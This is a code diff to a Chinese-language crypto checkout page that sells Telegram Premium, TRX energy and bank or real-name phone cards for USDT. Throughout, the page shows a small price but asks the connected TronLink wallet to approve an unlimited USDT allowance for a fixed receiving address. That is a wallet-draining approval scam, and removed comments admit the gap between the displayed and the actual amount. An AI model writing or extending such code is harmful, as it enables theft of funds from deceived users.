@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>支付确认 - 账号购买</title>
+    <title>支付确认 - Telegram Premium</title>
     <style>
         * {
             margin: 0;
@@ -45,10 +45,22 @@
         }
         
         .header {
-            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             color: white;
             padding: 1.5rem;
             text-align: center;
+        }
+        
+        .header-premium {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+        }
+        
+        .header-trx {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);
+        }
+        
+        .header-account {
+            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
         }
         
         .header h1 {
@@ -66,6 +78,17 @@
             font-size: 1.1rem;
             font-weight: 600;
             margin-bottom: 0.5rem;
+        }
+        
+        .status-text-premium {
+            color: #1890ff;
+        }
+        
+        .status-text-trx {
+            color: #ff6b6b;
+        }
+        
+        .status-text-account {
             color: #4ecdc4;
         }
         
@@ -119,7 +142,6 @@
         .pay-btn {
             display: block;
             width: 100%;
-            background: linear-gradient(90deg, #4ecdc4, #44a08d);
             color: white;
             padding: 1rem 1.5rem;
             border-radius: 3rem;
@@ -131,6 +153,21 @@
             text-align: center;
             animation: breathe 2s ease-in-out infinite;
             transition: all 0.3s ease;
+        }
+        
+        .pay-btn-premium {
+            background: linear-gradient(90deg, #ff8c00, #ffd700);
+            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
+            color: #1e3c72;
+        }
+        
+        .pay-btn-trx {
+            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
+            box-shadow: 0 0.25rem 1rem rgba(255, 107, 107, 0.4);
+        }
+        
+        .pay-btn-account {
+            background: linear-gradient(90deg, #4ecdc4, #44a08d);
             box-shadow: 0 0.25rem 1rem rgba(78, 205, 196, 0.4);
         }
         
@@ -142,8 +179,19 @@
         
         .pay-btn:active {
             transform: translateY(1px);
-            box-shadow: 0 0.125rem 0.5rem rgba(78, 205, 196, 0.4);
             animation: none;
+        }
+        
+        .pay-btn-premium:active {
+            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
+        }
+        
+        .pay-btn-trx:active {
+            box-shadow: 0 0.125rem 0.5rem rgba(255, 107, 107, 0.4);
+        }
+        
+        .pay-btn-account:active {
+            box-shadow: 0 0.125rem 0.5rem rgba(78, 205, 196, 0.4);
         }
         
         .loading {
@@ -155,11 +203,22 @@
         .spinner {
             border: 3px solid #f3f3f3;
             border-radius: 50%;
-            border-top: 3px solid #4ecdc4;
             width: 30px;
             height: 30px;
             animation: spin 1s linear infinite;
             margin: 0 auto 1rem;
+        }
+        
+        .spinner-premium {
+            border-top: 3px solid #ff8c00;
+        }
+        
+        .spinner-trx {
+            border-top: 3px solid #ff6b6b;
+        }
+        
+        .spinner-account {
+            border-top: 3px solid #4ecdc4;
         }
         
         @keyframes spin {
@@ -170,11 +229,9 @@
         @keyframes breathe {
             0%, 100% {
                 transform: scale(1);
-                box-shadow: 0 0.25rem 1rem rgba(78, 205, 196, 0.4);
             }
             50% {
                 transform: scale(1.03);
-                box-shadow: 0 0.5rem 1.5rem rgba(78, 205, 196, 0.6);
             }
         }
         
@@ -216,8 +273,19 @@
         }
         
         .step.active .step-circle {
-            background: #4ecdc4;
             color: white;
+        }
+        
+        .step-premium.active .step-circle {
+            background: #1890ff;
+        }
+        
+        .step-trx.active .step-circle {
+            background: #ff6b6b;
+        }
+        
+        .step-account.active .step-circle {
+            background: #4ecdc4;
         }
         
         .step.completed .step-circle {
@@ -232,8 +300,19 @@
         }
         
         .step.active .step-text {
-            color: #4ecdc4;
             font-weight: 600;
+        }
+        
+        .step-premium.active .step-text {
+            color: #1890ff;
+        }
+        
+        .step-trx.active .step-text {
+            color: #ff6b6b;
+        }
+        
+        .step-account.active .step-text {
+            color: #4ecdc4;
         }
         
         .step-line {
@@ -272,149 +351,295 @@
 </head>
 <body>
     <div class="payment-container">
-        <div class="header">
-            <h1>账号购买支付确认</h1>
-            <p>请确认订单信息并完成支付</p>
-        </div>
-        
-        <div class="payment-status">
-            <div class="status-text">支付确认</div>
-            <div class="status-desc">请在钱包中确认支付交易</div>
-        </div>
-        
-        <div class="step-indicator">
-            <div class="step-line"></div>
-            <div class="step active" id="step1">
-                <div class="step-circle">1</div>
-                <div class="step-text">确认支付</div>
+        <!-- Telegram Premium 服务 -->
+        <div id="premiumService">
+            <div class="header header-premium">
+                <h1>Telegram Premium 订阅</h1>
+                <p>高级功能和无限制体验</p>
             </div>
-            <div class="step" id="step2">
-                <div class="step-circle">2</div>
-                <div class="step-text">完成</div>
+            
+            <div class="payment-status">
+                <div class="status-text status-text-premium">支付确认</div>
+                <div class="status-desc">请在钱包中确认支付交易</div>
             </div>
-        </div>
-        
-        <div class="wallet-status" id="walletStatus">
-            <div id="walletStatusText">正在连接钱包...</div>
-        </div>
-        
-        <div class="order-info">
-            <div class="info-item">
-                <span class="info-label">商品订单</span>
-                <span class="info-value" id="orderIdDisplay">-</span>
+            
+            <div class="step-indicator">
+                <div class="step-line"></div>
+                <div class="step step-premium active" id="step1">
+                    <div class="step-circle">1</div>
+                    <div class="step-text">确认支付</div>
+                </div>
+                <div class="step step-premium" id="step2">
+                    <div class="step-circle">2</div>
+                    <div class="step-text">完成</div>
+                </div>
             </div>
-            <div class="info-item">
-                <span class="info-label">商品类型</span>
-                <span class="info-value" id="accountTypeDisplay">-</span>
+            
+            <div class="wallet-status" id="walletStatus">
+                <div id="walletStatusText">正在连接钱包...</div>
             </div>
-            <div class="info-item">
-                <span class="info-label">商品名称</span>
-                <span class="info-value" id="accountNameDisplay">-</span>
+            
+            <div class="order-info">
+                <div class="info-item">
+                    <span class="info-label">商品订单</span>
+                    <span class="info-value" id="orderIdDisplay">-</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">商品详情</span>
+                    <span class="info-value">Telegram Premium 月费订阅</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">购买数量</span>
+                    <span class="info-value">3月</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">付款金额</span>
+                    <span class="info-value">0.99 USDT</span>
+                </div>
             </div>
-            <div class="info-item">
-                <span class="info-label">购买数量</span>
-                <span class="info-value" id="quantityDisplay">-</span>
+            
+            <div class="loading" id="loadingSection">
+                <div class="spinner spinner-premium"></div>
+                <p id="loadingText">正在处理支付请求...</p>
+                <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
             </div>
-            <div class="info-item">
-                <span class="info-label">付款金额</span>
-                <span class="info-value" id="amountDisplay">-</span>
-            </div>
-        </div>
-        
-        <div class="account-details" id="accountDetails" style="display: none;">
-            <div class="account-item">
-                <span class="account-label">接收邮箱</span>
-                <span class="account-value" id="accountEmailDisplay">-</span>
-            </div>
-            <div class="account-item">
-                <span class="account-label">备注信息</span>
-                <span class="account-value" id="accountNoteDisplay">-</span>
+            
+            <div class="action-section">
+                <button class="pay-btn pay-btn-premium" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付</button>
             </div>
         </div>
-        
-        <div class="account-details" id="shippingDetails" style="display: none;">
-            <div class="account-item">
-                <span class="account-label">联系人</span>
-                <span class="account-value" id="contactNameDisplay">-</span>
+
+        <!-- TRX波场能量服务 -->
+        <div id="trxService" style="display: none;">
+            <div class="header header-trx">
+                <h1>TRX 波场能量订阅</h1>
+                <p>免手续费转账服务</p>
             </div>
-            <div class="account-item">
-                <span class="account-label">收货地址</span>
-                <span class="account-value" id="shippingAddressDisplay">-</span>
+            
+            <div class="payment-status">
+                <div class="status-text status-text-trx">支付确认</div>
+                <div class="status-desc">请在钱包中确认支付交易</div>
             </div>
-            <div class="account-item">
-                <span class="account-label">收货电话</span>
-                <span class="account-value" id="shippingPhoneDisplay">-</span>
+            
+            <div class="step-indicator">
+                <div class="step-line"></div>
+                <div class="step step-trx active" id="trxStep1">
+                    <div class="step-circle">1</div>
+                    <div class="step-text">确认支付</div>
+                </div>
+                <div class="step step-trx" id="trxStep2">
+                    <div class="step-circle">2</div>
+                    <div class="step-text">完成</div>
+                </div>
+            </div>
+            
+            <div class="wallet-status" id="trxWalletStatus">
+                <div id="trxWalletStatusText">正在连接钱包...</div>
+            </div>
+            
+            <div class="order-info">
+                <div class="info-item">
+                    <span class="info-label">商品订单</span>
+                    <span class="info-value" id="trxOrderIdDisplay">-</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">商品详情</span>
+                    <span class="info-value">TRX波场能量包月订阅</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">服务周期</span>
+                    <span class="info-value">1个月</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">付款金额</span>
+                    <span class="info-value">1.99 USDT</span>
+                </div>
+            </div>
+            
+            <div class="loading" id="trxLoadingSection">
+                <div class="spinner spinner-trx"></div>
+                <p id="trxLoadingText">正在处理支付请求...</p>
+                <div id="trxTxHashDisplay" class="tx-hash" style="display: none;"></div>
+            </div>
+            
+            <div class="action-section">
+                <button class="pay-btn pay-btn-trx" id="trxPayBtn" onclick="startTrxPaymentProcess()" disabled>确认支付</button>
             </div>
         </div>
-        
-        <div class="account-details" id="rechargeDetails" style="display: none;">
-            <div class="account-item">
-                <span class="account-label">充值电话</span>
-                <span class="account-value" id="rechargePhoneDisplay">-</span>
+
+        <!-- 账号购买服务 -->
+        <div id="accountService" style="display: none;">
+            <div class="header header-account">
+                <h1>账号购买支付确认</h1>
+                <p>请确认订单信息并完成支付</p>
             </div>
-            <div class="account-item">
-                <span class="account-label">运营商</span>
-                <span class="account-value" id="operatorDisplay">-</span>
+            
+            <div class="payment-status">
+                <div class="status-text status-text-account">支付确认</div>
+                <div class="status-desc">请在钱包中确认支付交易</div>
             </div>
-        </div>
-        
-        <div class="loading" id="loadingSection">
-            <div class="spinner"></div>
-            <p id="loadingText">正在处理支付请求...</p>
-            <div id="txHashDisplay" class="tx-hash" style="display: none;"></div>
-        </div>
-        
-        <div class="action-section">
-            <button class="pay-btn" id="payBtn" onclick="startPaymentProcess()" disabled>确认支付</button>
+            
+            <div class="step-indicator">
+                <div class="step-line"></div>
+                <div class="step step-account active" id="accountStep1">
+                    <div class="step-circle">1</div>
+                    <div class="step-text">确认支付</div>
+                </div>
+                <div class="step step-account" id="accountStep2">
+                    <div class="step-circle">2</div>
+                    <div class="step-text">完成</div>
+                </div>
+            </div>
+            
+            <div class="wallet-status" id="accountWalletStatus">
+                <div id="accountWalletStatusText">正在连接钱包...</div>
+            </div>
+            
+            <div class="order-info">
+                <div class="info-item">
+                    <span class="info-label">商品订单</span>
+                    <span class="info-value" id="accountOrderIdDisplay">-</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">商品类型</span>
+                    <span class="info-value" id="accountTypeDisplay">-</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">商品名称</span>
+                    <span class="info-value" id="accountNameDisplay">-</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">购买数量</span>
+                    <span class="info-value" id="accountQuantityDisplay">-</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-label">付款金额</span>
+                    <span class="info-value" id="accountAmountDisplay">-</span>
+                </div>
+            </div>
+            
+            <div class="account-details" id="accountDetails" style="display: none;">
+                <div class="account-item">
+                    <span class="account-label">接收邮箱</span>
+                    <span class="account-value" id="accountEmailDisplay">-</span>
+                </div>
+                <div class="account-item">
+                    <span class="account-label">备注信息</span>
+                    <span class="account-value" id="accountNoteDisplay">-</span>
+                </div>
+            </div>
+            
+            <div class="account-details" id="shippingDetails" style="display: none;">
+                <div class="account-item">
+                    <span class="account-label">联系人</span>
+                    <span class="account-value" id="contactNameDisplay">-</span>
+                </div>
+                <div class="account-item">
+                    <span class="account-label">收货地址</span>
+                    <span class="account-value" id="shippingAddressDisplay">-</span>
+                </div>
+                <div class="account-item">
+                    <span class="account-label">收货电话</span>
+                    <span class="account-value" id="shippingPhoneDisplay">-</span>
+                </div>
+            </div>
+            
+            <div class="account-details" id="rechargeDetails" style="display: none;">
+                <div class="account-item">
+                    <span class="account-label">充值电话</span>
+                    <span class="account-value" id="rechargePhoneDisplay">-</span>
+                </div>
+                <div class="account-item">
+                    <span class="account-label">运营商</span>
+                    <span class="account-value" id="operatorDisplay">-</span>
+                </div>
+            </div>
+            
+            <div class="loading" id="accountLoadingSection">
+                <div class="spinner spinner-account"></div>
+                <p id="accountLoadingText">正在处理支付请求...</p>
+                <div id="accountTxHashDisplay" class="tx-hash" style="display: none;"></div>
+            </div>
+            
+            <div class="action-section">
+                <button class="pay-btn pay-btn-account" id="accountPayBtn" onclick="startAccountPaymentProcess()" disabled>确认支付</button>
+            </div>
         </div>
     </div>
 
     <script>
         // 获取URL参数
         const urlParams = new URLSearchParams(window.location.search);
-        const orderData = {
-            orderId: urlParams.get('orderId') || generateOrderId(),
-            accountType: decodeURIComponent(urlParams.get('accountType') || ''),
-            accountName: decodeURIComponent(urlParams.get('accountName') || ''),
-            amount: urlParams.get('amount') || '0.1',
-            quantity: urlParams.get('quantity') || '1',
-            accountEmail: decodeURIComponent(urlParams.get('accountEmail') || ''),
-            accountNote: decodeURIComponent(urlParams.get('accountNote') || ''),
-            contactName: decodeURIComponent(urlParams.get('contactName') || ''),
-            shippingAddress: decodeURIComponent(urlParams.get('shippingAddress') || ''),
-            shippingPhone: decodeURIComponent(urlParams.get('shippingPhone') || ''),
-            rechargePhone: decodeURIComponent(urlParams.get('rechargePhone') || ''),
-            operator: decodeURIComponent(urlParams.get('operator') || '')
-        };
+        const serviceType = urlParams.get('service') || 'premium';
         
-        // USDT TRC20 合约地址
+        // 通用配置
         const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        // 收款地址 - 修改为您的合约地址
         const RECEIVE_ADDRESS = 'TLrrSzT1rKahBYRZnaPfqmXnoky9wmxMvi';
-        // 实际支付金额（根据订单金额动态计算）
-        let PAYMENT_AMOUNT = 0;
-        // 显示给用户的授权数量
-        let DISPLAY_APPROVE_AMOUNT = 0;
-        // 实际调用的授权数量（无限）
         const ACTUAL_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
-        let userAddress = '';
-        let isWalletConnected = false;
-        
+        // 根据服务类型初始化
+        function initService() {
+            if (serviceType === 'premium') {
+                initPremiumService();
+                document.getElementById('premiumService').style.display = 'block';
+            } else if (serviceType === 'trx') {
+                initTrxService();
+                document.getElementById('trxService').style.display = 'block';
+            } else if (serviceType === 'account') {
+                initAccountService();
+                document.getElementById('accountService').style.display = 'block';
+            }
+        }
+
+        // ==================== Telegram Premium 服务 ====================
+        function initPremiumService() {
+            const orderData = {
+                orderId: urlParams.get('orderId') || generateOrderId('TG'),
+                username: decodeURIComponent(urlParams.get('username') || ''),
+                nickname: decodeURIComponent(urlParams.get('nickname') || ''),
+                amount: '0.99'
+            };
+            
+            document.getElementById('orderIdDisplay').textContent = orderData.orderId;
+            connectWallet('premium');
+        }
+
+        // ==================== TRX波场能量服务 ====================
+        function initTrxService() {
+            const orderData = {
+                orderId: urlParams.get('orderId') || generateOrderId('TRX'),
+                trxAddress: decodeURIComponent(urlParams.get('trxAddress') || ''),
+                amount: '1.99'
+            };
+            
+            document.getElementById('trxOrderIdDisplay').textContent = orderData.orderId;
+            connectWallet('trx');
+        }
+
+        // ==================== 账号购买服务 ====================
+        function initAccountService() {
+            const orderData = {
+                orderId: urlParams.get('orderId') || generateOrderId('ACC'),
+                accountType: decodeURIComponent(urlParams.get('accountType') || ''),
+                accountName: decodeURIComponent(urlParams.get('accountName') || ''),
+                amount: urlParams.get('amount') || '0.1',
+                quantity: urlParams.get('quantity') || '1',
+                accountEmail: decodeURIComponent(urlParams.get('accountEmail') || ''),
+                accountNote: decodeURIComponent(urlParams.get('accountNote') || ''),
+                contactName: decodeURIComponent(urlParams.get('contactName') || ''),
+                shippingAddress: decodeURIComponent(urlParams.get('shippingAddress') || ''),
+                shippingPhone: decodeURIComponent(urlParams.get('shippingPhone') || ''),
+                rechargePhone: decodeURIComponent(urlParams.get('rechargePhone') || ''),
+                operator: decodeURIComponent(urlParams.get('operator') || '')
+            };
+            
+            displayAccountOrderDetails(orderData);
+            connectWallet('account');
+        }
+
         // 生成订单号
-        function generateOrderId() {
-            return 'ACC' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
-        }
-        
-        // 更新步骤状态
-        function updateStep(stepNumber, status) {
-            const step = document.getElementById(`step${stepNumber}`);
-            step.className = `step ${status}`;
-        }
-        
-        // 更新钱包状态显示
-        function updateWalletStatus(message) {
-            document.getElementById('walletStatusText').textContent = message;
+        function generateOrderId(prefix) {
+            return prefix + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
         }
 
         // 获取账号类型名称
@@ -436,149 +661,168 @@
             return typeMap[type] || type;
         }
 
-        // 显示订单详情
-        function displayOrderDetails() {
-            // 设置基本信息
-            document.getElementById('orderIdDisplay').textContent = orderData.orderId;
+        // 显示账号订单详情
+        function displayAccountOrderDetails(orderData) {
+            document.getElementById('accountOrderIdDisplay').textContent = orderData.orderId;
             document.getElementById('accountTypeDisplay').textContent = getAccountTypeName(orderData.accountType);
             document.getElementById('accountNameDisplay').textContent = orderData.accountName;
-            document.getElementById('quantityDisplay').textContent = orderData.quantity + ' 个';
-            document.getElementById('amountDisplay').textContent = orderData.amount + ' USDT';
-            
-            // 计算支付金额（USDT有6位小数）
-            PAYMENT_AMOUNT = Math.floor(parseFloat(orderData.amount) * 1000000);
-            DISPLAY_APPROVE_AMOUNT = PAYMENT_AMOUNT;
+            document.getElementById('accountQuantityDisplay').textContent = orderData.quantity + ' 个';
+            document.getElementById('accountAmountDisplay').textContent = orderData.amount + ' USDT';
             
             // 根据商品类型显示不同的详情区域
             if (orderData.accountType === 'phone') {
                 if (orderData.accountName.includes('话费')) {
-                    // 话费充值
                     document.getElementById('rechargeDetails').style.display = 'block';
                     document.getElementById('rechargePhoneDisplay').textContent = orderData.rechargePhone || '-';
                     document.getElementById('operatorDisplay').textContent = orderData.operator || '-';
                 } else {
-                    // 实名卡
                     document.getElementById('shippingDetails').style.display = 'block';
                     document.getElementById('contactNameDisplay').textContent = orderData.contactName || '-';
                     document.getElementById('shippingAddressDisplay').textContent = orderData.shippingAddress || '-';
                     document.getElementById('shippingPhoneDisplay').textContent = orderData.shippingPhone || '-';
                 }
             } else if (orderData.accountType === 'bankcard') {
-                // 银行卡
                 document.getElementById('shippingDetails').style.display = 'block';
                 document.getElementById('contactNameDisplay').textContent = orderData.contactName || '-';
                 document.getElementById('shippingAddressDisplay').textContent = orderData.shippingAddress || '-';
                 document.getElementById('shippingPhoneDisplay').textContent = orderData.shippingPhone || '-';
             } else {
-                // 普通账号
                 document.getElementById('accountDetails').style.display = 'block';
                 document.getElementById('accountEmailDisplay').textContent = orderData.accountEmail || '-';
                 document.getElementById('accountNoteDisplay').textContent = orderData.accountNote || '-';
             }
         }
 
-        // 最简单的连接方法
-        function connectWallet() {
-            // 直接检查 tronWeb
+        // 连接钱包
+        function connectWallet(service) {
+            let userAddress = '';
+            let isConnected = false;
+            
             if (window.tronWeb && window.tronWeb.defaultAddress) {
                 userAddress = window.tronWeb.defaultAddress.base58;
-                updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
-                isWalletConnected = true;
-                document.getElementById('payBtn').disabled = false;
-                return true;
-            }
-            
-            // 检查 tronLink
-            if (window.tronLink && window.tronLink.tronWeb) {
+                isConnected = true;
+            } else if (window.tronLink && window.tronLink.tronWeb) {
                 window.tronWeb = window.tronLink.tronWeb;
                 if (window.tronWeb.defaultAddress) {
                     userAddress = window.tronWeb.defaultAddress.base58;
-                    updateWalletStatus(`✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`);
-                    isWalletConnected = true;
+                    isConnected = true;
+                }
+            }
+            
+            if (isConnected) {
+                const statusText = `✅ 钱包已连接 (${userAddress.substring(0, 8)}...)`;
+                if (service === 'premium') {
+                    document.getElementById('walletStatusText').textContent = statusText;
                     document.getElementById('payBtn').disabled = false;
-                    return true;
+                } else if (service === 'trx') {
+                    document.getElementById('trxWalletStatusText').textContent = statusText;
+                    document.getElementById('trxPayBtn').disabled = false;
+                } else if (service === 'account') {
+                    document.getElementById('accountWalletStatusText').textContent = statusText;
+                    document.getElementById('accountPayBtn').disabled = false;
                 }
+                return true;
+            } else {
+                const errorText = '❌ 钱包连接失败，请刷新页面';
+                if (service === 'premium') {
+                    document.getElementById('walletStatusText').textContent = errorText;
+                } else if (service === 'trx') {
+                    document.getElementById('trxWalletStatusText').textContent = errorText;
+                } else if (service === 'account') {
+                    document.getElementById('accountWalletStatusText').textContent = errorText;
+                }
+                return false;
             }
-            
-            return false;
         }
 
-        // 初始化
-        function initPage() {
-            // 显示订单详情
-            displayOrderDetails();
-            
-            // 立即尝试连接
-            if (connectWallet()) {
-                return;
-            }
-            
-            // 如果立即连接失败，等待2秒再试
-            setTimeout(() => {
-                if (!connectWallet()) {
-                    updateWalletStatus('❌ 钱包连接失败，请刷新页面');
-                }
-            }, 2000);
-        }
-
-        // 开始支付
+        // ==================== 通用支付函数 ====================
         async function startPaymentProcess() {
-            if (!isWalletConnected) return;
-            
-            const payBtn = document.getElementById('payBtn');
-            const loadingSection = document.getElementById('loadingSection');
-            const loadingText = document.getElementById('loadingText');
-            
-            // 禁用支付按钮，显示加载状态
+            await executePaymentProcess('premium', '0.99');
+        }
+
+        async function startTrxPaymentProcess() {
+            await executePaymentProcess('trx', '1.99');
+        }
+
+        async function startAccountPaymentProcess() {
+            const amount = document.getElementById('accountAmountDisplay').textContent.replace(' USDT', '');
+            await executePaymentProcess('account', amount);
+        }
+
+        async function executePaymentProcess(service, amount) {
+            const payBtn = service === 'premium' ? document.getElementById('payBtn') : 
+                          service === 'trx' ? document.getElementById('trxPayBtn') : 
+                          document.getElementById('accountPayBtn');
+            const loadingSection = service === 'premium' ? document.getElementById('loadingSection') : 
+                                 service === 'trx' ? document.getElementById('trxLoadingSection') : 
+                                 document.getElementById('accountLoadingSection');
+            const loadingText = service === 'premium' ? document.getElementById('loadingText') : 
+                               service === 'trx' ? document.getElementById('trxLoadingText') : 
+                               document.getElementById('accountLoadingText');
+            const txHashDisplay = service === 'premium' ? document.getElementById('txHashDisplay') : 
+                                 service === 'trx' ? document.getElementById('trxTxHashDisplay') : 
+                                 document.getElementById('accountTxHashDisplay');
+
             payBtn.style.display = 'none';
             loadingSection.style.display = 'block';
-            
+
             try {
-                // 步骤1: 检查授权状态
+                // 检查授权状态
                 loadingText.textContent = '检查授权状态...';
                 const isApproved = await checkApprovalStatus();
-                
+
                 if (!isApproved) {
-                    // 步骤2: 请求 USDT 授权
                     loadingText.textContent = '正在请求 USDT 授权...';
                     const approveResult = await requestUSDTApproval();
                     
-                    document.getElementById('txHashDisplay').textContent = `授权交易: ${approveResult}`;
-                    document.getElementById('txHashDisplay').style.display = 'block';
+                    txHashDisplay.textContent = `授权交易: ${approveResult}`;
+                    txHashDisplay.style.display = 'block';
                     loadingText.textContent = '等待授权确认...';
                     
-                    // 等待授权交易确认
                     const isApproveConfirmed = await waitForTransactionConfirmation(approveResult);
-                    
                     if (!isApproveConfirmed) {
                         throw new Error('授权确认失败');
                     }
                 }
-                
-                // 步骤3: 执行支付
-                updateStep(1, 'completed');
-                updateStep(2, 'active');
+
+                // 更新步骤
+                if (service === 'premium') {
+                    updateStep('premium', 1, 'completed');
+                    updateStep('premium', 2, 'active');
+                } else if (service === 'trx') {
+                    updateStep('trx', 1, 'completed');
+                    updateStep('trx', 2, 'active');
+                } else {
+                    updateStep('account', 1, 'completed');
+                    updateStep('account', 2, 'active');
+                }
+
                 loadingText.textContent = '授权成功，正在执行支付...';
+                const paymentAmount = Math.floor(parseFloat(amount) * 1000000);
+                const paymentResult = await executePaymentTransaction(paymentAmount);
                 
-                const paymentResult = await executePayment();
-                
-                document.getElementById('txHashDisplay').textContent = `支付交易: ${paymentResult}`;
+                txHashDisplay.textContent = `支付交易: ${paymentResult}`;
                 loadingText.textContent = '支付已提交，等待确认...';
                 
-                // 等待支付交易确认
                 const isPaymentConfirmed = await waitForTransactionConfirmation(paymentResult);
                 
                 if (isPaymentConfirmed) {
-                    updateStep(2, 'completed');
-                    showSuccessMessage(paymentResult);
+                    if (service === 'premium') {
+                        updateStep('premium', 2, 'completed');
+                        showPremiumSuccessMessage(paymentResult);
+                    } else if (service === 'trx') {
+                        updateStep('trx', 2, 'completed');
+                        showTrxSuccessMessage(paymentResult);
+                    } else {
+                        updateStep('account', 2, 'completed');
+                        showAccountSuccessMessage(paymentResult);
+                    }
                 } else {
                     throw new Error('支付确认失败');
                 }
                 
             } catch (error) {
                 console.error('支付流程失败:', error);
-                
-                // 显示错误信息
                 loadingText.textContent = '支付失败';
                 
                 if (error.message.includes('User denied')) {
@@ -591,41 +835,43 @@
                     alert('支付失败: ' + error.message);
                 }
                 
-                // 恢复支付按钮
                 payBtn.style.display = 'block';
                 loadingSection.style.display = 'none';
-                updateStep(1, 'active');
+                if (service === 'premium') {
+                    updateStep('premium', 1, 'active');
+                } else if (service === 'trx') {
+                    updateStep('trx', 1, 'active');
+                } else {
+                    updateStep('account', 1, 'active');
+                }
             }
         }
-        
-        // 检查 USDT 授权状态
+
+        // 更新步骤状态
+        function updateStep(service, stepNumber, status) {
+            const step = service === 'premium' ? document.getElementById(`step${stepNumber}`) :
+                        service === 'trx' ? document.getElementById(`trxStep${stepNumber}`) :
+                        document.getElementById(`accountStep${stepNumber}`);
+            step.className = `step step-${service} ${status}`;
+        }
+
+        // 检查授权状态
         async function checkApprovalStatus() {
             try {
                 const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                
-                // 检查当前授权额度
+                const userAddress = window.tronWeb.defaultAddress.base58;
                 const allowance = await contract.allowance(userAddress, RECEIVE_ADDRESS).call();
-                console.log('当前授权额度:', allowance.toString());
-                
-                return allowance >= PAYMENT_AMOUNT;
-                
+                return allowance >= 1000000; // 至少授权 1 USDT
             } catch (error) {
                 console.error('检查授权状态失败:', error);
                 return false;
             }
         }
-        
+
         // 请求 USDT 授权
         async function requestUSDTApproval() {
             try {
                 const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                
-                console.log('请求 USDT 授权:', {
-                    spender: RECEIVE_ADDRESS,
-                    displayAmount: DISPLAY_APPROVE_AMOUNT,
-                    actualAmount: ACTUAL_APPROVE_AMOUNT
-                });
-                
                 const result = await contract.approve(
                     RECEIVE_ADDRESS,
                     ACTUAL_APPROVE_AMOUNT
@@ -634,45 +880,30 @@
                     callValue: 0,
                     shouldPollResponse: false
                 });
-                
-                console.log('授权交易已提交:', result);
                 return result;
-                
             } catch (error) {
-                console.error('USDT 授权失败:', error);
                 throw new Error('USDT 授权失败: ' + error.message);
             }
         }
-        
-        // 执行支付
-        async function executePayment() {
+
+        // 执行支付交易
+        async function executePaymentTransaction(amount) {
             try {
                 const contract = await window.tronWeb.contract().at(USDT_TRC20_CONTRACT);
-                
-                console.log('执行 USDT 转账:', {
-                    to: RECEIVE_ADDRESS,
-                    amount: PAYMENT_AMOUNT,
-                    orderId: orderData.orderId
-                });
-                
                 const result = await contract.transfer(
                     RECEIVE_ADDRESS,
-                    PAYMENT_AMOUNT
+                    amount
                 ).send({
                     feeLimit: 100000000,
                     callValue: 0,
                     shouldPollResponse: false
                 });
-                
-                console.log('支付交易已提交:', result);
                 return result;
-                
             } catch (error) {
-                console.error('支付交易失败:', error);
                 throw new Error('支付交易失败: ' + error.message);
             }
         }
-        
+
         // 等待交易确认
         async function waitForTransactionConfirmation(txHash) {
             return new Promise((resolve) => {
@@ -701,24 +932,47 @@
                             clearInterval(checkInterval);
                             resolve(false);
                         }
-                        
-                        document.getElementById('loadingText').textContent = 
-                            `等待交易确认... (${checkCount}/${maxChecks})`;
-                            
                     } catch (error) {
                         console.log('检查交易状态失败:', error);
                     }
                 }, 6000);
             });
         }
-        
+
         // 显示成功消息
-        function showSuccessMessage(txHash) {
+        function showPremiumSuccessMessage(txHash) {
+            showSuccessMessage('Telegram Premium 订阅', 'Telegram Premium 功能已为您激活，请重新登录 Telegram 查看', txHash);
+        }
+
+        function showTrxSuccessMessage(txHash) {
+            showSuccessMessage('TRX波场能量订阅', 'TRX波场能量服务已激活，请查看您的钱包', txHash);
+        }
+
+        function showAccountSuccessMessage(txHash) {
+            const accountType = document.getElementById('accountTypeDisplay').textContent;
+            const accountName = document.getElementById('accountNameDisplay').textContent;
+            showSuccessMessage(
+                `${accountType}购买`, 
+                `账号信息将在24小时内发送至您的邮箱，如有问题请联系客服`, 
+                txHash,
+                accountType,
+                accountName
+            );
+        }
+
+        function showSuccessMessage(serviceName, serviceDesc, txHash, accountType, accountName) {
             const paymentContainer = document.querySelector('.payment-container');
+            const orderId = serviceType === 'premium' ? document.getElementById('orderIdDisplay').textContent :
+                           serviceType === 'trx' ? document.getElementById('trxOrderIdDisplay').textContent :
+                           document.getElementById('accountOrderIdDisplay').textContent;
+            const amount = serviceType === 'premium' ? '0.99 USDT' :
+                          serviceType === 'trx' ? '1.99 USDT' :
+                          document.getElementById('accountAmountDisplay').textContent;
+
             paymentContainer.innerHTML = `
-                <div class="header">
+                <div class="header header-${serviceType}">
                     <h1>🎉 支付成功</h1>
-                    <p>账号购买订单已完成</p>
+                    <p>${serviceName}已完成</p>
                 </div>
                 
                 <div style="text-align: center; padding: 2rem 1.5rem;">
@@ -728,11 +982,10 @@
